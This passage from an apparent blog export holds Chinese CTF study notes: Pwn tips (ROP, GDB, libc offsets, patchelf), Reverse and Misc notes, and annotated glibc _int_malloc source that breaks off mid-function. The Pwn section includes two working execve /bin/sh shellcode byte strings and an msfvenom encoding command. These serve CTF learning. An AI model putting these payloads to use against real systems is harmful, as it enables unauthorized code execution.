 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2. &gt; 注意：构建超长ROP链时，必要时刻需要重置栈  </span><br><span class="line">    &gt; 防止因为部分关键数据被覆盖而导致调用syscall的函数无法使用  </span><br><span class="line">    &gt; 例子: hgame2020 ROP_LEVEL0 构建 open-read-puts 链</span><br><span class="line"></span><br><span class="line"><span class="comment">## 7. GDB</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#输出system函数的内存地址</span></span><br><span class="line">gdb-peda$ <span class="builtin-name">print</span> system</span><br><span class="line"><span class="comment">#显示某个地址上的值，x表示examine，s表示string</span></span><br><span class="line">db-peda$ x/s 0x7FFFF7F7ECEE</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ol>
<h2 id="8-libc-相关">8. libc 相关</h2>
<ol>
<li>
<p><a href="https://github.com/matrix1001/glibc-all-in-one" target="_blank" rel="noopener">glibc-all-in-one</a></p>
</li>
<li>
<p>pwn 题给出的 <a href="http://libc.so" target="_blank" rel="noopener">libc.so</a></p>
<ol>
<li>可用于得到 system 函数和&quot;/bin/bash&quot;相对于库基址的偏移量</li>
<li>在程序中得到某个函数泄露出的地址之后，例如 write 函数的 GOT 地址，即可通过偏移量调用 system(&quot;/bin/bash&quot;)</li>
</ol>
</li>
<li>
<p>libc-database : 通过某些函数的地址来查询 libc 的版本 - <a href="https://libc.blukat.me/" target="_blank" rel="noopener">在线工具</a></p>
</li>
<li>
<p>更换加载的 <a href="http://libc.so" target="_blank" rel="noopener">libc.so</a></p>
<ol>
<li>
<p><a href="https://www.mankier.com/1/patchelf#--force-rpath" target="_blank" rel="noopener">patchelf 手册页</a></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter &lt;libc_ld&gt; &lt;elf_name&gt; <span class="comment"># 设置链接器</span></span><br><span class="line">patchelf --<span class="built_in">set</span>-rpath &lt;libc_parent_folder&gt;:/&lt;libc_name&gt; &lt;elf_name&gt;</span><br><span class="line"><span class="comment"># patchelf --add-needed # 添加libc.so</span></span><br><span class="line"><span class="comment"># patchelf --replace-needed # 替换libc.so</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p><a href="https://bbs.pediy.com/thread-225849.htm" target="_blank" rel="noopener">关于不同版本 glibc 强行加载的方法</a></p>
</li>
</ol>
<blockquote>
<p>注意，更换使用的libc时，一定要同时更换对应版本的<code>ld.so</code>链接器，否则会无法正常使用libc而导致段错误</p>
</blockquote>
</li>
</ol>
<h2 id="9-shellcode">9.  shellcode</h2>
<ol>
<li>
<p><a href="http://shell-storm.org/shellcode" target="_blank" rel="noopener">shellcode 数据库</a></p>
</li>
<li>
<p>常用 shellcode</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Linux x86-64 29 bytes</span></span><br><span class="line"><span class="keyword">char</span> code[] = <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span>;</span><br><span class="line"><span class="comment">// Linux x86 21 bytes</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>生成特定格式的 shellcode - msfven</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import sys; sys.stdout.write("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'</span> |  msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o output.txt</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="10-Linux-Syscall-Reference">10. Linux Syscall Reference</h2>
<ol>
<li><a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">x86</a>
<blockquote>
<p>int <code>execve</code>(const char *<code>pathname</code>, char *const <code>argv</code>[], char *const <code>envp</code>[]);<br>
<code>sys_exec</code> : <code>eax</code> = 0xB, <code>ebx</code> = path_str_addr, <code>ecx</code> = NULL, <code>edx</code> = NULL</p>
</blockquote>
</li>
<li><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">x64</a></li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF Reverse 的笔记</title>
    <url>/2020/04/reverse/</url>
    <content><![CDATA[<ul>
<li>笔者会把一些曾经遇到过的Reverse知识点记录在这里。</li>
<li>但笔者并非主攻二进制逆向，故逆向笔记会相对较少。</li>
</ul>
<h2 id="1-迷宫问题（maze）">1. 迷宫问题（maze）</h2>
<p>迷宫问题有以下特点:</p>
<ul>
<li>在内存中布置一张 “地图”，这个地图可能是字符（例如<code>#</code>之类的），也可能是一些数字的二进制</li>
<li>将用户输入限制在少数几个字符范围内.</li>
<li>一般只有一个迷宫入口和一个迷宫出口</li>
</ul>
<p>详情<a href="https://ctf-wiki.github.io/ctf-wiki/reverse/maze/maze-zh/" target="_blank" rel="noopener">CTF-Wiki</a></p>
<a id="more"></a>]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF Misc 的笔记</title>
    <url>/2020/04/misc/</url>
    <content><![CDATA[<p>一点点曾经整理的Misc笔记，数量较少。</p>
<h2 id="1-git">1. git</h2>
<ol>
<li>
<p>查找所有 commit - <a href="https://www.cnblogs.com/Tkitn/p/11648456.html" target="_blank" rel="noopener">参考链接</a></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看所有commit，包括已撤回的提交</span></span><br><span class="line">git <span class="built_in">log</span> --reflog</span><br><span class="line"><span class="comment"># 重置commit头</span></span><br><span class="line">git reset --hard [commit-Hash]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看 git 提交的文件内容 - <a href="https://blog.csdn.net/daguanjia11/article/details/73309026" target="_blank" rel="noopener">git 对象库</a></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看所有提交log（包括已撤回的提交）</span></span><br><span class="line">git <span class="built_in">log</span> --pretty=raw</span><br><span class="line"><span class="comment"># 查看某个Hash值对应的类型</span></span><br><span class="line">git cat-file -t [Hash]</span><br><span class="line"><span class="comment"># 查看某个Hash值对应的内容</span></span><br><span class="line">git cat-file -p [tree/file-Hash]</span><br><span class="line"><span class="comment"># 查看树的内容</span></span><br><span class="line">git ls-tree [-r是否递归][-t输出更完整的信息（包括子树）] [commit/tree-hash]</span><br></pre></td></tr></table></figure>
</li>
</ol>
<a id="more"></a>
<h2 id="2-隐藏文件">2. 隐藏文件</h2>
<ol>
<li>
<p>Binwalk - <a href="https://www.cnblogs.com/2f28/p/9736902.html" target="_blank" rel="noopener">帮助</a></p>
<ol>
<li>
<p>查看隐藏的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -I xxxx</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>提取所有隐藏文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e xxxx</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h2 id="3-各种神奇的编码">3. 各种神奇的编码</h2>
<ol>
<li>
<p>编码方式</p>
<ol>
<li><a href="https://tool.bugku.com/" target="_blank" rel="noopener">CTF 编码小工具</a></li>
<li>培根密码 - <a href="https://tool.bugku.com/peigen/" target="_blank" rel="noopener">在线工具</a> - <a href="https://baike.baidu.com/item/%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81/2134182?fr=aladdin" target="_blank" rel="noopener">百度百科</a></li>
<li>栅栏密码 - <a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">在线工具</a> - <a href="https://baike.baidu.com/item/%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81/228209?fr=aladdin" target="_blank" rel="noopener">百度百科</a></li>
<li>Ook! - <a href="https://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">在线工具</a></li>
<li>base32 - <a href="https://www.qqxiuzi.cn/bianma/base.php" target="_blank" rel="noopener">在线工具</a></li>
<li>base64 - <a href="https://base64.supfree.net/" target="_blank" rel="noopener">在线工具</a></li>
<li>base64 &lt;==&gt;图片 - <a href="http://www.vgot.net/test/image2base64.php" target="_blank" rel="noopener">在线转换</a></li>
</ol>
</li>
<li>
<p>编码集</p>
<ol>
<li>Unicode
<ol>
<li>Unicode 编码格式为&quot;\uXXXX&quot;
<ol>
<li>倘若遇上&quot;\uXX&quot;，需要将其补 0 至 4 个 Hex 值</li>
</ol>
</li>
<li>可用 python 直接 Unicode 转 string</li>
</ol>
</li>
<li>base 编码 - <a href="https://blog.csdn.net/qq_40836885/article/details/83793972" target="_blank" rel="noopener">Base64，Base32，Base16 的区别</a>
<ol>
<li>Base64：包含大写字母（A-Z）,小写字母（a-z），数字（0-9）以及+/
<ol>
<li>当 ASCll 用 Base 加密达不到所对应的位数的时候用=号补齐</li>
<li><strong>Base64隐写</strong><br>
先看图<br>
<img src="/2020/04/misc/base64steganography.png" alt="img">
<ul>
<li>注意红色的 0, base64解码时将其丢弃了, 所以这里的值不会影响解码. 故我们可以在这进行隐写。</li>
<li>为什么等号的那部分 0 不能用于隐写? 因为修改那里的二进制值会导致等号数量变化, 解码的第 1 步会受影响. 自然也就破坏了源字符串。</li>
<li>而红色部分的 0 是作为最后一个字符二进制的组成部分, 还原时只用到了最后一个字符二进制的前部分, 后面的部分就不会影响还原。</li>
<li>唯一的影响就是最后一个字符会变化，请自己看看上图</li>
</ul>
</li>
</ol>
</li>
<li>Base32: 包含大写字母（A-Z），数字（2-7）</li>
<li>Base16: 就是 16 进制，范围是数字(0-9)，字母（A-F）</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="4-图片">4. 图片</h2>
<ol>
<li>二维码解码 - <a href="https://jiema.wwei.cn/" target="_blank" rel="noopener">在线工具</a></li>
<li>PNG 文件头&quot;‰PNG&quot;(Hex:89504E47)</li>
<li>Stegsolve 解 LSB隐写</li>
<li>双图对比（<code>beyond compare</code>命令对比）</li>
<li>steghide 提取文件</li>
</ol>
<h2 id="5-压缩包">5. 压缩包</h2>
<ol>
<li>ZIP 文件以“PK”开头（Hex：504B0304）</li>
<li>ZIP 伪加密 - <a href="https://blog.csdn.net/kajweb/article/details/76474476" target="_blank" rel="noopener">CSDN</a></li>
<li>明文攻击 =&gt; 加密压缩包
<ul>
<li>在已经得到压缩包的部分文件的情况下使用，</li>
<li>需要将这部分文件使用被加密压缩包 <strong>相同的压缩算法</strong> 进行压缩</li>
</ul>
</li>
<li>CRC32碰撞
<ul>
<li>在压缩包文件大小较小的情况下可以优先考虑</li>
</ul>
</li>
</ol>
<h2 id="6-音频">6. 音频</h2>
<ol>
<li>频谱图隐写</li>
<li>波形谱隐写（转二进制）</li>
</ol>
<h2 id="7-内存取证">7. 内存取证</h2>
<ol>
<li>volatility</li>
</ol>
<h2 id="8-游戏存档修改">8. 游戏存档修改</h2>
<ol>
<li><a href="http://www.saveeditonline.com/" target="_blank" rel="noopener">在线存档修改</a></li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 7 - _int_malloc 源码及其部分分析</title>
    <url>/2020/04/heap-7-%20__int_malloc_source/</url>
    <content><![CDATA[<p><code>__int_malloc</code> —— 核心内存分配函数</p>
<a id="more"></a>
<blockquote>
<p>所有的分析都以注释的形式添加进源代码中，方便阅读</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将用户申请的内存大小，在检测后，转换为申请的chunk大小</span></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果arena是空的，那就直接调用sysmalloc分配一块内存给用户</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">  alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果request chunk size满足fast chunk的大小</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 根据request chunk size,找出应当被分配的fast bin索引与地址</span></span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="comment">// 遍历出第一个fast chunk</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      victim = pp;</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">            != victim);</span><br><span class="line">    <span class="comment">// 如果遍历出的fast chunk 地址不是空的</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 做一些常规fast chunk检查</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">      errout:</span><br><span class="line">        malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 既然该fast chunk是可被分配的，那就做chunk检测</span></span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="comment">// 将chunk地址转换为用户所使用的地址</span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      <span class="comment">// 如果相关位已设置，那就初始化该内存</span></span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果fast bin无法满足需求，并且所申请的chunk大小满足small chunk的范围</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 取出相关索引与small bin地址</span></span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取出small bin的链尾chunk的地址</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 如果这是第一次执行该代码语句</span></span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果有满足条件的small chunk</span></span><br><span class="line">        <span class="comment">// 那就将其从small bin上断开</span></span><br><span class="line">        <span class="comment">// 并作相关chunk检查</span></span><br><span class="line">        <span class="comment">// 最后再做一些操作后返回用户使用的指针</span></span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">        &#123;</span><br><span class="line">          errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">          <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 取出largebin的索引</span></span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="comment">// 如果有空闲的fast chunks，则执行malloc_consolidate</span></span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a "small" request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 进入 for 大循环</span></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 遍历所有unsorted chunk</span></span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="comment">// 进行unsorted chunk 大小检测，异常小或异常大都会导致出错</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">          || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</span><br><span class="line">                          chunk2mem (victim), av);</span><br><span class="line">      <span class="comment">// 获取当前遍历到的unsorted chunk的size</span></span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">          If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">          only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">          runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">          exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">          no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果当前请求位于small chunks的大小范围内</span></span><br><span class="line">      <span class="comment">// 同时，unsorted bin里只有一个chunk，该chunk还是last_remainder</span></span><br><span class="line">      <span class="comment">// 并且该last_remainder的大小足够分配</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">          bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将该last_remainder 分割</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">// 同时，将这部分last_remainder放回unsorted bin里</span></span><br><span class="line">        unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">        <span class="comment">// 并把剩余部分置为新的last_remainder</span></span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 最后对切割出来的chunk进行一些常规操作并返回</span></span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      <span class="comment">// 将当前遍历到的unsorted chunk从unsorted bin里断开</span></span><br><span class="line">      unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果遍历到的这个unsorted chunk，它的大小与所申请的chunk大小刚刚好</span></span><br><span class="line">      <span class="comment">// 直接分配</span></span><br><span class="line">      <span class="keyword">if</span> (size == nb)</span><br><span class="line">      &#123;</span><br><span class="line">        set_inuse_bit_at_offset (victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 将所遍历到的unsorted chunk，按照chunk大小，分类放置进small bin或large bin中</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = smallbin_index (size);</span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 将遍历到的unsorted chunk放置进large bin里</span></span><br><span class="line">        victim_index = largebin_index (size);</span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="comment">// 如果large bin非空</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          <span class="comment">// 如果遍历到的unsorted chunk的size，小于 large bin链上large chunks的最小size</span></span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">//将当前遍历到的unsorted chunk接到当前large bin的链尾</span></span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            